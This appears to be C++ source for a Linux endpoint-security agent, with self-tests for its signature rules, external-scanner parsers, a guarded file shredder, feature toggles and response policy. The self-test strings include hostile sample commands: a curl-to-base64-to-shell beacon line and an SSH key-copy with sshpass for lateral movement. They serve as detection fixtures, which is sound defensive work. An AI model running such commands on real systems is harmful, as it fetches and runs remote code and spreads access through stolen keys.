                 "not writable as euid " + std::to_string(::geteuid()) + "; using /tmp instead");
        }
        const std::string p = dir + "/hyprnova-selftest-" + std::to_string(::getpid());
        const std::string payload = "hyprnova-selftest-payload";
        const bool wrote = fsx::write_atomic(
            p, {reinterpret_cast<const std::byte*>(payload.data()), payload.size()}, 0600);
        std::string back;
        const bool round = wrote && fsx::read_file(p, back) > 0 && back == payload;
        check("fsx::write_atomic + read_file round-trip", round, back);
        struct stat st {};
        const bool mode_ok = round && ::stat(p.c_str(), &st) == 0 && (st.st_mode & 0777) == 0600;
        check("fsx::write_atomic applies the requested mode", mode_ok,
              round ? std::format("{:o}", st.st_mode & 0777) : std::string("write failed"));
        (void)::unlink(p.c_str());
    }

    // 9. Detection floor: the built-in rule set must compile with no rule files on
    //    disk, otherwise a fresh install has zero signature coverage.
    {
        scanning::SignatureEngine eng;
        const auto n = eng.add_rules(scanning::builtin_rules());
        check("built-in signature rules compile", n > 0, std::format("{} rules", n));
        if (n > 0) {
            // Each payload must satisfy its rule's condition, not merely contain
            // one keyword: a rule that fires on a single common string would be a
            // false-positive machine, and a self-test that accepts one match would
            // not notice.
            const std::vector<std::pair<std::string_view, std::vector<std::string>>> cases = {
                {"HyprNova_C2_BeaconTooling",
                 {"/bin/sh -c curl -s http://10.0.0.1/x | base64 -d | sh"}},
                {"HyprNova_Ransomware_Behaviour",
                 {"YOUR FILES HAVE BEEN ENCRYPTED -- read HOW TO DECRYPT, send 0.5 bitcoin",
                  "EVP_EncryptUpdate"}},
                {"HyprNova_ShellcodeLoader_Artifacts",
                 {"mmap mprotect PROT_EXEC /proc/self/mem ptrace __libc_start_main"}},
                {"HyprNova_Lateral_Movement_SSH",
                 {"cat ~/.ssh/id_rsa >> authorized_keys; sshpass -p x ssh user@10.0.0.5"}},
            };
            for (const auto& [expected_rule, strings] : cases) {
                const auto m = eng.scan_strings(strings, "selftest");
                const bool hit = std::any_of(m.begin(), m.end(), [&](const scanning::Match& x) {
                    return x.rule == expected_rule;
                });
                check(std::string("built-in rule ") + std::string(expected_rule) +
                          " fires on its behaviour artefacts",
                      hit, hit ? std::string("matched")
                               : (m.empty() ? std::string("no match at all") : m.front().rule));
            }
            // And the negative control: an ordinary command must not trip the C2
            // rule, or the detection floor is worthless.
            const auto benign = eng.scan_strings({"ls -la /var/log && systemctl status nginx"},
                                                 "selftest-benign");
            check("built-in rules do NOT fire on an ordinary shell command", benign.empty(),
                  benign.empty() ? std::string("clean") : benign.front().rule);
        }
    }

    // N. Toolbox parsers: fixtures for the four external scanners, so a parsing
    //    change can never silently zero the findings of a real scan.
    {
        using tools::Toolbox;
        {
            const auto w = Toolbox::parse_rkhunter(
                "Performing checks...\n[ Warning ] (hidden_file) /usr/lib/.something\n"
                "  Checking for preloaded libs: No warnings\nWarning: suspicious SUID found: "
                "/usr/local/bin/x\nChecks complete: 2 warning(s) found");
            check("rkhunter parser extracts warning lines, ignores noise",
                  w.size() == 2 && w[0].find("hidden_file") != std::string::npos &&
                      w[1].find("suspicious SUID") != std::string::npos,
                  std::format("{} finding(s)", w.size()));
        }
        {
            const auto w = Toolbox::parse_chkrootkit(
                "ROOTDIR is `/'\nChecking `chfn'... not infected\n"
                "INFECTED: /usr/bin/strings has rootkit hint\nChecking `w'... not infected");
            check("chkrootkit parser extracts INFECTED lines only",
                  w.size() == 1 && w[0].find("strings") != std::string::npos,
                  std::format("{} finding(s)", w.size()));
        }
        {
            const auto w = Toolbox::parse_clamav(
                "/tmp/eicar: Eicar-Signature FOUND\n/tmp/clean: OK\n\n----------- SCAN SUMMARY -----------");
            check("clamav parser extracts FOUND verdict lines",
                  w.size() == 1 && w[0].find("Eicar") != std::string::npos,
                  std::format("{} finding(s)", w.size()));
        }
        {
            const auto idx = Toolbox::parse_lynis_index(
                "  Lynis security scan details:\n  Hardening index : 61\n  Tests performed: 250");
            check("lynis parser reads the hardening index",
                  idx.has_value() && *idx == 61,
                  idx ? std::format("index {}", *idx) : std::string("not found"));
        }
        {
            const auto ps = Toolbox::proc_security();
            check("proc security audit counts the live process table",
                  ps.processes > 0 && ps.seccomp_none + ps.seccomp_classic + ps.seccomp_filter <=
                                          ps.processes,
                  std::format("{} processes ({} filtered)", ps.processes, ps.seccomp_filter));
        }
    }

    // O. Combined-scan + systemd + rescue parsers (Module 8b/8c/8d fixtures).
    {
        using tools::Toolbox;
        check("combined profiles are exactly quick|deep|kernel|audit",
              Toolbox::valid_profile("deep") && !Toolbox::valid_profile("everything"));
        {
            const auto units = Toolbox::parse_systemd_table(
                "UNIT                                 EXPOSURE PREDICATE HAPPY\n"
                "chrony.service                            3.5 OK        :-)\n"
                "dbus.service                              9.3 UNSAFE    :-{\n"
                "getty@tty1.service                        9.6 UNSAFE    :-{\n");
            check("systemd security parser reads unit/exposure and sorts worst-first",
                  units.size() == 3 && units[0].unit == "getty@tty1.service" &&
                      units[0].exposure > 9.0 && units[2].grade == "OK",
                  std::format("{} unit(s), worst {}", units.size(),
                              units.empty() ? "?" : units[0].unit));
        }
        {
            check("kernel taint probe reads the live sysctl",
                  Toolbox::kernel_taint() >= 0, std::format("taint {}", Toolbox::kernel_taint()));
        }
        {
            // rescue report ingest: fixture file
            const std::string tmp = "/tmp/hyprnova-selftest-rescue-report.json";
            { std::ofstream o(tmp); o << "{\"finished_epoch\": 1700000000, \"finding_count\": 2}"; }
            const auto rep = Toolbox::parse_rescue_report(tmp);
            check("rescue report ingest parses the machine-readable summary",
                  rep.has_value() && rep->integer("finding_count") == 2,
                  rep ? std::format("count {}", rep->integer("finding_count"))
                      : std::string("unparseable"));
        }
    }

    // P. Shredder safety, AI contract, feature-table consistency (Module 9/10).
    {
        {
            remediation::Shredder sh{cfg_};
            check("shredder refuses every protected system prefix",
                  remediation::Shredder::protected_path("/etc") &&
                      remediation::Shredder::protected_path("/etc/passwd") &&
                      remediation::Shredder::protected_path("/usr/bin/ls") &&
                      remediation::Shredder::protected_path("/boot/hyprnova/x") &&
                      remediation::Shredder::protected_path("/var/lib/hyprnova/shadow") &&
                      !remediation::Shredder::protected_path("/home/u/file") &&
                      !remediation::Shredder::protected_path("/etc-backup/f"),  // not under /etc
                  "prefix semantics verified");
            // symlink is never followed outside the selection
            const std::string dir = "/tmp/hyprnova-shred-selftest";
            std::error_code ec;
            fs::remove_all(dir, ec);
            fs::create_directories(dir, ec);
            { std::ofstream o(dir + "/secret.txt"); o << "keep me"; }
            fs::create_symlink(dir + "/secret.txt", dir + "/link");
            const auto plan = sh.plan({dir + "/link"}, remediation::Shredder::Method::Standard);
            check("shredder plans a symlink as a link (target untouched)",
                  plan.ok && plan.links == 1 && plan.files == 0 &&
                      core::fsx::is_file(dir + "/secret.txt"),
                  std::format("{} item(s)", plan.items.size()));
            const auto out = sh.execute(plan, true);
            check("shredder removes the link only and records it",
                  out.ok && out.links_removed == 1 &&
                      core::fsx::is_file(dir + "/secret.txt") && !out.audit_line.empty(),
                  out.audit_line.substr(0, 60));
            const auto refused = sh.plan({"/etc/passwd"}, remediation::Shredder::Method::Standard);
            check("shredder refuses a plan against /etc/passwd",
                  !refused.ok && refused.items.empty() && !refused.refusals.empty(),
                  refused.refusals.empty() ? "?" : refused.refusals.front());
            const auto unconf = sh.plan({dir + "/secret.txt"}, remediation::Shredder::Method::Standard);
            const auto nope = sh.execute(unconf, false);
            check("shredder execution without confirmation is a no-op",
                  !nope.ok && nope.files_removed == 0 &&
                      core::fsx::is_file(dir + "/secret.txt"),
                  "confirmation required");
            fs::remove_all(dir, ec);
        }
        {
            check("AI system prompt forbids autonomous destructive action",
                  ai::AiAnalyst::system_prompt().find("never executes anything") !=
                          std::string_view::npos &&
                      ai::AiAnalyst::system_prompt().find("EVIDENCE") != std::string_view::npos,
                  "contract present");
            const auto ans = ai::AiAnalyst::parse_answer(
                R"({"choices":[{"message":{"role":"assistant","content":"VERDICT: suspicious"}}]})");
            check("AI answer parser reads choices[0].message.content",
                  ans.has_value() && ans->find("suspicious") != std::string::npos,
                  ans.value_or("(none)"));
            ai::AiAnalyst inert{cfg_.ai};
            std::string why;
            check("AI analyst is inert without a key (offline-safe)",
                  !inert.ready(why) && why.find("ai.enabled") != std::string::npos,
                  why.substr(0, 60));
        }
        {
            // The toggle table and the settings table must never drift.
            Agent probe;  // default-constructed: feature_states must exist safely
            const auto states = probe.feature_states();
            check("feature toggle table is populated (21 switches)",
                  states.size() >= 21 &&
                      std::any_of(states.begin(), states.end(),
                                  [](const auto& st) { return st.key == "realtime_protection"; }) &&
                      std::any_of(states.begin(), states.end(),
                                  [](const auto& st) { return st.key == "process_polling"; }) &&
                      std::any_of(states.begin(), states.end(),
                                  [](const auto& st) { return st.key == "crowdsec"; }),
                  std::format("{} switch(es)", states.size()));
        }
        // Q. Unprivileged exec visibility (Module 4b) + dropper-trait rule.
        {
            behavioral::ProcPollSensor poll{bus_, cfg_, pool_};
            poll.set_scanner(nullptr);  // attribution without scans for the test
            // A freshly forked child must be discovered by the next sweep.
            const pid_t child = ::fork();
            if (child == 0) {
                ::execl("/bin/sleep", "sleep", "20", static_cast<char*>(nullptr));
                _exit(127);  // only on exec failure
            }
            std::this_thread::sleep_for(150ms);  // let the exec complete
            const auto found = poll.poll_once();
            check("proc-poll discovers a freshly exec'd child without root",
                  std::find(found.begin(), found.end(), child) != found.end(),
                  std::format("{} pid(s) discovered", found.size()));
            // Sweeping again must NOT re-report it (start time unchanged).
            const auto again = poll.poll_once();
            check("proc-poll does not re-report an unchanged process",
                  std::find(again.begin(), again.end(), child) == again.end(),
                  "no duplicates");
            ::kill(child, SIGKILL);
            int st = 0;
            ::waitpid(child, &st, 0);

            scanning::SignatureEngine eng;
            core::ScanConfig scan_cfg;  // defaults load the built-in rule set
            eng.load(scan_cfg);
            // 3 independent dropper primitives => the generic rule fires.
            const std::string dropper =
                "backup solution v1 step1: copy files to .locked step2: write "
                "README_RESTORE step3: demand bitcoin";
            const auto hits = eng.scan({reinterpret_cast<const std::byte*>(dropper.data()),
                                        dropper.size()});
            check("dropper-trait rule fires on 3 combined primitives",
                  std::any_of(hits.begin(), hits.end(), [](const auto& m) {
                      return m.rule == "HyprNova_Ransomware_Dropper_Traits";
                  }),
                  hits.empty() ? "no match" : hits.front().rule);
            // A legit updater: curl + sh is NORMAL there; none of the dropper
            // primitives appear, so the generic rule must stay silent.
            const std::string updater =
                "#!/bin/sh -e\ncurl -s https://example.com/updates | /bin/sh -c "
                "'apt-get update'\n";
            const auto clean = eng.scan({reinterpret_cast<const std::byte*>(updater.data()),
                                         updater.size()});
            check("dropper-trait rule does NOT fire on a legitimate updater script",
                  std::none_of(clean.begin(), clean.end(), [](const auto& m) {
                      return m.rule == "HyprNova_Ransomware_Dropper_Traits";
                  }),
                  clean.empty() ? "no rules fired" : clean.front().rule);
        }
    }

    // R. Batch-2: KVRT / package-verify / CrowdSec / sshd parsers (Module 8d/10b).
    {
        {
            // KVRT: detection lines parsed, noise ignored.
            const auto k = tools::Toolbox::parse_kvrt(
                "12:00:01 Detected object: /tmp/evil (Trojan.Linux.Agent)\n"
                "12:00:02 Object deleted: /tmp/evil\n"
                "Scan completed. Nothing else found.\n");
            check("kvrt parser extracts detection lines only",
                  k.size() == 2 &&
                      k.front().find("Trojan.Linux.Agent") != std::string::npos,
                  std::format("{} line(s)", k.size()));
        }
        {
            // dpkg --verify fixture: one unexplained /usr hit, one /etc admin
            // change, one missing file.
            const auto d = tools::Toolbox::parse_pkg_verify(
                "dpkg",
                "??5??????  /usr/bin/systemd-detect-virt\n"
                "??5??????  /etc/default/grub\n"
                "missing /usr/lib/x86_64-linux-gnu/libcrypto.so.3\n");
            const bool unexplained = std::any_of(d.begin(), d.end(), [](const auto& x) {
                return x.find("[UNEXPLAINED]") != std::string::npos &&
                       x.find("/usr/bin/systemd-detect-virt") != std::string::npos;
            });
            const bool admin = std::any_of(d.begin(), d.end(), [](const auto& x) {
                return x.find("[ADMIN]") != std::string::npos &&
                       x.find("/etc/default/grub") != std::string::npos;
            });
            const bool missing = std::any_of(d.begin(), d.end(), [](const auto& x) {
                return x.find("[MISSING]") != std::string::npos;
            });
            check("pkg-verify classifies admin vs unexplained vs missing",
                  d.size() == 3 && unexplained && admin && missing,
                  std::format("{} line(s)", d.size()));
        }
        {
            const auto c = tools::Toolbox::parse_crowdsec_decisions(
                R"({"decisions":[{"id":1,"value":"203.0.113.7","type":"ban",)"
                R"("reason":"bruteforce sshd","until":"2026-10-11T00:00:00Z","scope":"ip"}]})");
            check("crowdsec parser reads active bans from LAPI JSON",
                  c.size() == 1 && c.front().find("203.0.113.7") != std::string::npos &&
                      c.front().find("bruteforce sshd") != std::string::npos,
                  c.empty() ? "no decisions" : c.front().substr(0, 60));
            const auto c0 = tools::Toolbox::parse_crowdsec_decisions("not json at all");
            check("crowdsec parser survives malformed input",
                  c0.empty(), "graceful");
        }
        {
            // sshd weak settings: first-value-wins, weak knobs flagged with fixes.
            const auto w = hardening::audit_sshd_config(
                "# comment\nPermitRootLogin yes\nPasswordAuthentication no\n"
                "PermitRootLogin no\n");
            const bool root_yes = std::any_of(w.begin(), w.end(), [](const auto& x) {
                return x.key == "PermitRootLogin" && x.value == "yes" && !x.fix.empty();
            });
            const bool pwd_ok = std::none_of(w.begin(), w.end(), [](const auto& x) {
                return x.key == "PasswordAuthentication";
            });
            check("sshd audit flags weak knobs with first-value-wins + fixes",
                  root_yes && pwd_ok && w.size() >= 3,
                  std::format("{} weakness(es)", w.size()));
        }
    }

    r.passed = r.fatal.empty();
    return r;
}

// ---------------------------------------------------------------------------
// Feature toggles (user-friendly ON/OFF for whole protection areas)
// ---------------------------------------------------------------------------

bool Agent::set_feature(std::string_view key, bool on) noexcept {
    // Each entry: key -> mutator -> human description. A key not listed here
    // is rejected, never guessed: typos must not silently disable protection.
    struct Entry { const char* key; std::function<void(core::AgentConfig&, bool)> apply; const char* desc; };
    static const std::vector<Entry> kFeatures = {
        {"realtime_protection", [](core::AgentConfig& c, bool v) { c.ransomware.enabled = v; },
         "real-time file monitoring, entropy and mass-modify detection"},
        {"canaries",            [](core::AgentConfig& c, bool v) { c.canary.enabled = v; },
         "canary files and decoy directories (ransomware tripwires)"},
        {"heuristics",          [](core::AgentConfig& c, bool v) { c.heuristic.enabled = v; },
         "behavioural correlation and actor risk scoring"},
        {"auto_respond",        [](core::AgentConfig& c, bool v) { c.heuristic.auto_respond = v; },
         "act without asking on CRITICAL confidence (prompt otherwise)"},
        {"learning",            [](core::AgentConfig& c, bool v) { c.heuristic.learn_baseline = v; },
         "baseline learning period (fewer alerts on known-good behaviour)"},
        {"realtime_scanning",   [](core::AgentConfig& c, bool v) { c.scan.enabled = v; },
         "on-exec and on-demand signature scanning"},
        {"falco",               [](core::AgentConfig& c, bool v) { c.falco.enabled = v; },
         "Falco runtime-rule sensor"},
        {"auditd",              [](core::AgentConfig& c, bool v) { c.auditd.enabled = v; },
         "kernel audit sensor (exec/file/permission events)"},
        {"osquery",             [](core::AgentConfig& c, bool v) { c.osquery.enabled = v; },
         "osquery state queries"},
        {"suricata",            [](core::AgentConfig& c, bool v) { c.suricata.enabled = v; },
         "Suricata EVE network sensor (C2 beacon scoring)"},
        {"response",            [](core::AgentConfig& c, bool v) { c.remediation.enabled = v; },
         "response engine: freeze, quarantine, network blocks"},
        {"shadow_copies",       [](core::AgentConfig& c, bool v) { c.shadow.enabled = v; },
         "shadow-copy snapshots and restore points"},
        {"external_runners",    [](core::AgentConfig& c, bool v) { c.integrations.runner_enabled = v; },
         "allow launching external scanners (deep-scan tool sections)"},
        {"virustotal",          [](core::AgentConfig& c, bool v) { c.integrations.virustotal_enabled = v; },
         "VirusTotal hash lookups (needs an API key)"},
        {"sample_upload",       [](core::AgentConfig& c, bool v) { c.integrations.online_submission = v; },
         "allow uploading samples to online sandboxes (privacy!)"},
        {"ai_analyst",          [](core::AgentConfig& c, bool v) { c.ai.enabled = v; },
         "AI forensic assistant (Groq; needs an API key; advises only)"},
        {"dry_run",             [](core::AgentConfig& c, bool v) { c.dry_run = v; },
         "observe-only mode: detect but never act"},
        {"kernel_events_in_gui",[](core::AgentConfig& c, bool v) { c.gui.show_kernel_events = v; },
         "show low-level kernel events in the console feed"},
        {"rescue",              [](core::AgentConfig& c, bool v) { c.rescue.enabled = v; },
         "rescue-environment reboot scan (rootkit class)"},
        {"process_polling",     [](core::AgentConfig& c, bool v) { c.proc_poll.enabled = v; },
         "unprivileged exec visibility: /proc polling attributes new processes "
         "and triggers on-exec scans (no root needed)"},
        {"crowdsec",            [](core::AgentConfig& c, bool v) { c.integrations.crowdsec_enabled = v; },
         "CrowdSec community blocklist: read bans, push our C2 blocks (zero-day tripwire)"},
    };
    for (const auto& e : kFeatures) {
        if (key == e.key) {
            // Mutate a COPY and validate it first: a toggle that would produce
            // an invalid config (e.g. rescue on without an ISO) is refused with
            // the config untouched -- never half-applied, never persisted.
            auto candidate = cfg_;
            e.apply(candidate, on);
            std::vector<core::ConfigError> errs;
            core::validate(candidate, errs);
            if (!errs.empty()) {
                SERROR("agent", "feature '{}' refused by validation: {}", key,
                       errs.front().message);
                return false;
            }
            cfg_ = candidate;
            if (!core::save_config(cfg_, config_path_))
                SERROR("agent", "feature '{}' applied in memory but the config file "
                                "could not be saved; it will not survive a restart", key);
            return reload_config(std::format("feature toggle: {} = {}", key, on ? "on" : "off"));
        }
    }
    return false;
}

std::vector<Agent::FeatureState> Agent::feature_states() const noexcept {
    // Mirrors set_feature()'s table. Kept adjacent on purpose: add new keys in
    // both places (the self-test cross-checks the two lists).
    const std::vector<std::pair<std::string, bool>> states = {
        {"realtime_protection", cfg_.ransomware.enabled},
        {"canaries", cfg_.canary.enabled},
        {"heuristics", cfg_.heuristic.enabled},
        {"auto_respond", cfg_.heuristic.auto_respond},
        {"learning", cfg_.heuristic.learn_baseline},
        {"realtime_scanning", cfg_.scan.enabled},
        {"falco", cfg_.falco.enabled},
        {"auditd", cfg_.auditd.enabled},
        {"osquery", cfg_.osquery.enabled},
        {"suricata", cfg_.suricata.enabled},
        {"response", cfg_.remediation.enabled},
        {"shadow_copies", cfg_.shadow.enabled},
        {"external_runners", cfg_.integrations.runner_enabled},
        {"virustotal", cfg_.integrations.virustotal_enabled},
        {"sample_upload", cfg_.integrations.online_submission},
        {"ai_analyst", cfg_.ai.enabled},
        {"dry_run", cfg_.dry_run},
        {"kernel_events_in_gui", cfg_.gui.show_kernel_events},
        {"rescue", cfg_.rescue.enabled},
        {"process_polling", cfg_.proc_poll.enabled},
        {"crowdsec", cfg_.integrations.crowdsec_enabled},
    };
    std::vector<FeatureState> out;
    out.reserve(states.size());
    for (const auto& [k, v] : states) {
        out.push_back({k, v, {}});
    }
    return out;
}

// ---------------------------------------------------------------------------
// Event handling and policy enforcement
// ---------------------------------------------------------------------------

void Agent::on_event(const core::TelemetryEvent& ev) noexcept {
    // The GUI bridge keeps its own history ring; this subscriber exists so the
    // agent can react to its own lifecycle events (a sensor that goes down twice
    // in a row is worth an operator notification even when nothing is malicious).
    if (ev.kind != core::EventKind::SensorDown) return;
    if (ev.severity < core::Severity::High) return;
    if (remediation_) remediation_->notify("Sensor degraded", ev.message, ev.severity);
}

void Agent::enforce_policy(const core::TelemetryEvent& ev) noexcept {
    if (!cfg_.remediation.enabled) return;
    // Human-in-the-loop is the default: we may notify and prompt, but never act
    // alone. That is the only safe setting for an unsupervised fleet rollout.
    if (!cfg_.heuristic.auto_respond) return;
    if (heuristics_ && heuristics_->learning() && cfg_.heuristic.suppress_actions_during_learning) return;

    const auto sev = ev.severity;
    const auto risk = ev.risk_score;
    const pid_t pid = ev.actor.pid;
    const auto respond_threshold = cfg_.heuristic.auto_respond_threshold;

    // --- network containment -------------------------------------------------
    // Act on a suspected C2 endpoint as soon as one sensor names a concrete peer.
    // Blocking an outbound connection is cheap, TTL-bounded and self-healing, so
    // its false-positive cost is bounded in a way that killing a process is not.
    if ((ev.kind == core::EventKind::NetC2Suspect || ev.kind == core::EventKind::NetConnect) &&
        !ev.target.peer_ip.empty() && sev >= core::Severity::High) {
        const auto port = static_cast<std::uint16_t>(ev.target.peer_port);
        const auto ttl = std::chrono::duration_cast<std::chrono::seconds>(cfg_.remediation.block_duration);
        if (remediation_->block_c2(ev.target.peer_ip, port, ev.message, ttl)) {
            policy_actions_.fetch_add(1, std::memory_order_relaxed);

            // --- per-exe escalation (row 12) --------------------------------
            // One endpoint blocked is an incident; one executable collecting
            // endpoint after endpoint is a C2 actor that re-dials faster than
            // per-IP rules can follow. Count DISTINCT blocked endpoints per
            // exe and either contain the whole exe (policy allows) or put a
            // concrete recommendation in front of the operator.
            if (pid > 0 && cfg_.remediation.allow_exe_block && exe_escalation_) {
                const std::string exe = core::proc::read(pid).exe;
                const std::string endpoint =
                    ev.target.peer_ip + ":" + std::to_string(ev.target.peer_port);
                if (!exe.empty() &&
                    exe_escalation_->record(exe, endpoint) &&
                    exe_escalation_->distinct_for(exe) >=
                        static_cast<std::size_t>(cfg_.remediation.exe_block_after_endpoints)) {
                    std::string resolved;
                    if (cfg_.remediation.auto_block_by_exe) {
                        if (remediation_->block_exe(
                                pid,
                                std::format("phoning home to {} distinct blocked endpoints",
                                            exe_escalation_->distinct_for(exe)),
                                ttl, resolved))
                            policy_actions_.fetch_add(1, std::memory_order_relaxed);
                    } else {
                        remediation_->notify(
                            "Executable phoning home -- block recommendation",
                            std::format("{} now talks to {} distinct blocked endpoints. "
                                        "Contain it: hyprnova-cli block-exe {}",
                                        exe, exe_escalation_->distinct_for(exe), pid),
                            core::Severity::High);
                    }
                }
            }
        }
        return;
    }

    // --- file containment ----------------------------------------------------
    // Signature-confirmed malicious on disk: quarantine rather than delete.
    // Deletion destroys the evidence, and the attacker simply re-drops the file.
    if ((ev.kind == core::EventKind::YaraVerdict || ev.kind == core::EventKind::ScanVerdict) &&
        sev >= core::Severity::Critical && !ev.target.path.empty() && risk >= respond_threshold) {
        if (remediation_->quarantine_file(ev.target.path, ev.message))
            policy_actions_.fetch_add(1, std::memory_order_relaxed);
        return;
    }

    // --- process containment -------------------------------------------------
    if (pid <= 0) return;
    if (risk < respond_threshold && sev < core::Severity::Critical) return;

    // Signature evidence in the process itself (memory match, or a malicious
    // verdict on its own executable) justifies the irreversible action. Everything
    // else gets containment: freezing stops the damage, preserves the memory image
    // for the escalation pipeline, and is reversible if we were wrong.
    const bool memory_signature = ev.fields.count("mem_match") > 0;
    const bool signature_confirmed = memory_signature ||
                                     ev.fields.count("signature_confirmed") > 0;

    if (signature_confirmed && cfg_.remediation.allow_kill && risk >= respond_threshold) {
        if (remediation_->kill(pid, ev.message)) policy_actions_.fetch_add(1, std::memory_order_relaxed);
        return;
    }
    if (remediation_->capabilities().can_cgroup && cfg_.remediation.use_cgroup_containment) {
        if (remediation_->isolate(pid, ev.message))
            policy_actions_.fetch_add(1, std::memory_order_relaxed);
        return;
    }
    if (remediation_->suspend(pid, ev.message)) policy_actions_.fetch_add(1, std::memory_order_relaxed);
}

int Agent::posture_score() const noexcept {
    const auto st = stats();
    const auto& caps = remediation_->capabilities();
    int posture = 100;
    posture -= static_cast<int>(std::min<std::size_t>(st.sensors_degraded, 10) * 3);
    posture -= static_cast<int>(std::min<std::uint64_t>(st.pending_decisions, 5) * 8);
    if (st.events_dropped > 0) posture -= 10;
    if (cfg_.dry_run) posture -= 5;
    if (!caps.can_nftables) posture -= 5;
    if (!caps.can_cgroup) posture -= 5;
    if (::geteuid() != 0) posture -= 20;
    return std::clamp(posture, 0, 100);
}

std::string Agent::posture_label() const noexcept {
    const int p = posture_score();
    if (p >= 85) return "protected";
    if (p >= 60) return "reduced";
    if (p >= 35) return "at risk";
    return "unprotected";
}

void Agent::heartbeat() noexcept {
    const auto st = stats();
    core::TelemetryEvent ev;
    ev.sensor = core::SensorId::Agent;
    ev.kind = core::EventKind::Heartbeat;
    ev.severity = core::Severity::Info;
    ev.metric = static_cast<double>(st.uptime_seconds);
    ev.count = st.events_published;
    // This event IS the sign of life: a console or `hyprnova-cli watch` that sees
    // one of these knows the agent is running, not hung. The message leads with
    // "alive" so it is unmissable in a feed, and carries the posture so a single
    // line answers "is the host OK?" without a second round trip.
    const int posture = posture_score();
    ev.message = std::format("alive: uptime={}s posture={}/100 ({}) sensors={}/{} published={} "
                             "dispatched={} dropped={} decisions={} blocks={} suspended={} learning={:.0f}%",
                             st.uptime_seconds, posture, posture_label(), st.sensors_running,
                             st.sensors_running + st.sensors_degraded, st.events_published,
                             st.events_dispatched, st.events_dropped, st.pending_decisions,
                             st.active_blocks, st.suspended_pids,
                             st.heuristic_learning_progress * 100.0);
    ev.fields["alive"] = "yes";
    ev.fields["uptime"] = std::to_string(st.uptime_seconds);
    ev.fields["posture"] = std::to_string(posture);
    ev.fields["posture_label"] = posture_label();
    ev.fields["dropped"] = std::to_string(st.events_dropped);
    ev.fields["pool_queued"] = std::to_string(pool_.queued());
    ev.fields["pool_rejected"] = std::to_string(pool_.rejected());
    ev.fields["log_dropped"] = std::to_string(core::logger().dropped());

    if (st.events_dropped > 0) {
        // A dropping bus means detection is silently going blind. That is an
        // operator-visible condition, not a debug counter.
        ev.severity = core::Severity::High;
        ev.triggers.push_back("event_bus_saturated");
        SWARN("agent", "event bus has dropped {} events since start: raise agent.bus_ring_depth or "
                       "reduce sensor verbosity",
              st.events_dropped);
    }
    if (pool_.rejected() > 0) {
        ev.severity = std::max(ev.severity, core::Severity::Medium);
        ev.triggers.push_back("thread_pool_saturated");
    }
    static_cast<void>(bus_.publish(std::move(ev)));
}

AgentStats Agent::stats() const noexcept {
    AgentStats s;
    s.version = std::string(kVersion);
    s.config_path = config_path_;
    s.events_published = bus_.published();
    s.events_dispatched = bus_.dispatched();
    s.events_dropped = bus_.dropped();
    if (started_at_ != core::SysClock::time_point{}) {
        s.uptime_seconds = static_cast<std::uint64_t>(
            std::chrono::duration_cast<std::chrono::seconds>(core::SysClock::now() - started_at_).count());
    }
    s.sensors_running = sensors_.count() - sensors_.degraded_count();
    s.sensors_degraded = sensors_.degraded_count();
    if (remediation_) {
        s.pending_decisions = remediation_->pending().size();
        s.active_blocks = remediation_->active_blocks().size();
        s.suspended_pids = remediation_->suspended_pids().size();
    }
    if (heuristics_) s.heuristic_learning_progress = heuristics_->learning_progress();
    return s;
}

}  // namespace hyprnova
